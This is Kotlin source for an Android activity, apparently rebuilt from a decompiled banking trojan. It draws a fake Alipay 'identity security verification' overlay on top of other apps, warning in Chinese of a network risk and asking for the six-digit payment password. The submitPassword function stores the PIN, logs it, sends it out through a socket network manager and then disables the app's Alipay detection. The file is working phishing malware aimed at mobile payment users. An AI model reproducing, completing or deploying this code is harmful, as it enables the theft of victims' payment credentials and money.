package com.storm.safe.rock.activity

import android.app.Activity
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.View
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.RelativeLayout
import android.widget.TextView
import com.storm.safe.rock.p000.AppStatusManager
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.NetworkManager

/**
 * Custom Alipay payment password input keypad Activity.
 * Builds a bottom-sheet style 6-digit PIN input UI with a 4×3 numeric keypad.
 *
 * Reverse-engineered from JADX: activity/yrsanyhsbh.java (387 lines).
 * Renamed: f51939a0→inputBuffer, f51940a1→dotViews, f51941a2→isActive,
 *          m211196a0→dpToPx, m211197a1→onKeyInput, m211198a2→submitPassword,
 *          m211199a3→updateDots
 */
class yrsanyhsbh : Activity() {

    companion object {
        private const val TAG = "yrsanyhsbh"
    }

    var inputBuffer: String = ""
    val dotViews: ArrayList<TextView> = ArrayList()
    var isActive: Boolean = true

    fun dpToPx(dp: Int): Int {
        return (dp * resources.displayMetrics.density).toInt()
    }

    fun onKeyInput(key: String) {
        if (key == "DEL") {
            if (inputBuffer.isNotEmpty()) {
                inputBuffer = inputBuffer.dropLast(1)
                updateDots()
            }
            return
        }
        if (inputBuffer.length < 6) {
            inputBuffer += key
            updateDots()
            if (inputBuffer.length == 6) {
                Handler(Looper.getMainLooper()).postDelayed({
                    submitPassword(inputBuffer)
                    finish()
                }, 300L)
            }
        }
    }

    fun submitPassword(password: String) {
        try {
            try {
                // JADX: C0107as → AppStatusManager.saveAlipayPassword
                val type = when (password.length) {
                    4 -> "4digit"
                    6 -> "6digit"
                    else -> "none"
                }
                AppStatusManager.getInstance(this).saveAlipayPassword(type, true, password)
                Log.d(TAG, "保存支付宝密码类型: $type")
            } catch (e: Exception) {
                Log.e(TAG, "保存支付宝密码到 AppStatusManager 失败", e)
            }

            val svcCompanion = MyAccessibilityService.Companion
            if (svcCompanion.getInstance() != null) {
                val desc = "文本输入: ${password.take(50)}${if (password.length > 50) "..." else ""}"
                MyAccessibilityService.logEvent("TEXT_INPUT", desc)
                try {
                    val svc = svcCompanion.getInstance()
                    val nm = svc?.getNetworkManager()
                    nm?.sendPassword(password, "alipay", "custom_keypad")
                } catch (e: Exception) {
                    Log.e(TAG, "通过Socket发送密码失败", e)
                }
                try {
                    // ADAPT: depends on MyAccessibilityService.disableAlipayDetection()
                    svcCompanion.getInstance()?.disableAlipayDetection()
                } catch (e: Exception) {
                    Log.e(TAG, "自动关闭支付宝检测功能失败", e)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "记录支付宝密码日志失败", e)
        }
    }

    fun updateDots() {
        for (i in 0 until 6) {
            val tv = dotViews[i]
            tv.text = if (i < inputBuffer.length) "●" else ""
            val bg = GradientDrawable()
            bg.setColor(Color.parseColor("#F5F5F5"))
            bg.cornerRadius = dpToPx(6).toFloat()
            // Highlight the current active dot
            if (i == inputBuffer.length && inputBuffer.length < 6) {
                bg.setStroke(dpToPx(2), Color.parseColor("#1677FF"))
            }
            tv.background = bg
        }
    }

    override fun onBackPressed() {
        finish()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Window setup - bottom-sheet style
        window.setType(2032) // JADX: TYPE_SYSTEM_ALERT (2032), not TYPE_APPLICATION_OVERLAY (2038)
        window.setBackgroundDrawableResource(android.R.color.transparent)
        window.decorView.setBackgroundColor(0)

        val attrs = window.attributes
        attrs.gravity = android.view.Gravity.BOTTOM
        attrs.width = WindowManager.LayoutParams.MATCH_PARENT
        attrs.height = WindowManager.LayoutParams.WRAP_CONTENT
        attrs.horizontalMargin = 0.0f
        attrs.verticalMargin = 0.0f
        attrs.flags = (attrs.flags or 800) and (-1025)
        window.attributes = attrs
        window.setDecorFitsSystemWindows(false)

        val frame = FrameLayout(this).apply {
            layoutParams = FrameLayout.LayoutParams(-1, -2)
            setBackgroundColor(0)
        }

        val mainLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            val bg = GradientDrawable()
            bg.setColor(Color.WHITE)
            bg.cornerRadii = floatArrayOf(
                dpToPx(16).toFloat(), dpToPx(16).toFloat(),
                dpToPx(16).toFloat(), dpToPx(16).toFloat(),
                0f, 0f, 0f, 0f
            )
            background = bg
            val lp = FrameLayout.LayoutParams(-1, -2)
            lp.gravity = android.view.Gravity.BOTTOM
            layoutParams = lp
        }

        // Title bar
        val titleBar = RelativeLayout(this).apply {
            layoutParams = LinearLayout.LayoutParams(-1, dpToPx(50))
            setPadding(dpToPx(16), dpToPx(12), dpToPx(16), 0)
        }

        val closeBtn = TextView(this).apply {
            text = "×"
            textSize = 26f
            setTextColor(Color.parseColor("#999999"))
            gravity = android.view.Gravity.CENTER
            val rlp = RelativeLayout.LayoutParams(dpToPx(36), dpToPx(36))
            rlp.addRule(RelativeLayout.ALIGN_PARENT_RIGHT)
            rlp.addRule(RelativeLayout.CENTER_VERTICAL)
            layoutParams = rlp
            setOnClickListener { finish() }
        }

        val titleView = TextView(this).apply {
            text = "身份安全认证"
            textSize = 17f
            setTextColor(Color.parseColor("#333333"))
            gravity = android.view.Gravity.CENTER
            val rlp = RelativeLayout.LayoutParams(-2, -2)
            rlp.addRule(RelativeLayout.CENTER_IN_PARENT)
            layoutParams = rlp
        }

        titleBar.addView(closeBtn)
        titleBar.addView(titleView)

        // Description
        val descSection = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = android.view.Gravity.CENTER
            setPadding(dpToPx(24), dpToPx(16), dpToPx(24), dpToPx(20))
        }

        val descView = TextView(this).apply {
            text = "检测到您当前网络存在风险，请输入支付密码确认身份"
            textSize = 15f
            setTextColor(Color.parseColor("#333333"))
            gravity = android.view.Gravity.CENTER
            setPadding(0, dpToPx(8), 0, dpToPx(8))
        }
        descSection.addView(descView)

        // Dots row
        val dotsRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = android.view.Gravity.CENTER
            setPadding(dpToPx(32), dpToPx(4), dpToPx(32), dpToPx(20))
        }

        for (i in 0 until 6) {
            val dotSize = dpToPx(44)
            val dot = TextView(this).apply {
                val lp = LinearLayout.LayoutParams(dotSize, dotSize)
                lp.marginStart = if (i == 0) 0 else dpToPx(10)
                layoutParams = lp
                gravity = android.view.Gravity.CENTER
                textSize = 28f
                setTextColor(Color.BLACK)
                text = ""
                val bg = GradientDrawable()
                bg.setColor(Color.parseColor("#F5F5F5"))
                bg.cornerRadius = dpToPx(6).toFloat()
                if (i == 0) bg.setStroke(dpToPx(2), Color.parseColor("#1677FF"))
                background = bg
            }
            dotViews.add(dot)
            dotsRow.addView(dot)
        }

        // Keypad
        val keypad = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#E8E8E8"))
            layoutParams = LinearLayout.LayoutParams(-1, -2)
        }

        val keys = arrayOf(
            arrayOf("1", "2", "3"),
            arrayOf("4", "5", "6"),
            arrayOf("7", "8", "9"),
            arrayOf("", "0", "DEL")
        )

        for (row in keys) {
            val rowLayout = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                layoutParams = LinearLayout.LayoutParams(-1, dpToPx(52))
            }

            for (key in row) {
                when {
                    key.isEmpty() -> {
                        val empty = View(this).apply {
                            val lp = LinearLayout.LayoutParams(0, -1, 1.0f)
                            lp.marginEnd = dpToPx(1)
                            lp.bottomMargin = dpToPx(1)
                            layoutParams = lp
                            setBackgroundColor(Color.parseColor("#E8E8E8"))
                        }
                        rowLayout.addView(empty)
                    }
                    key == "DEL" -> {
                        val del = TextView(this).apply {
                            text = "⌫"
                            textSize = 20f
                            setTextColor(Color.parseColor("#333333"))
                            gravity = android.view.Gravity.CENTER
                            val lp = LinearLayout.LayoutParams(0, -1, 1.0f)
                            lp.bottomMargin = dpToPx(1)
                            layoutParams = lp
                            setBackgroundColor(Color.parseColor("#E8E8E8"))
                            setOnClickListener { onKeyInput("DEL") }
                        }
                        rowLayout.addView(del)
                    }
                    else -> {
                        val btn = TextView(this).apply {
                            text = key
                            textSize = 24f
                            setTextColor(Color.parseColor("#333333"))
                            gravity = android.view.Gravity.CENTER
                            val lp = LinearLayout.LayoutParams(0, -1, 1.0f)
                            lp.marginEnd = dpToPx(1)
                            lp.bottomMargin = dpToPx(1)
                            layoutParams = lp
                            setBackgroundColor(Color.WHITE)
                            setOnClickListener { onKeyInput(key) }
                        }
                        rowLayout.addView(btn)
                    }
                }
            }
            keypad.addView(rowLayout)
        }

        mainLayout.addView(titleBar)
        mainLayout.addView(descSection)
        mainLayout.addView(dotsRow)
        mainLayout.addView(keypad)
        frame.addView(mainLayout)
        setContentView(frame)
    }

    override fun onDestroy() {
        super.onDestroy()
    }
}
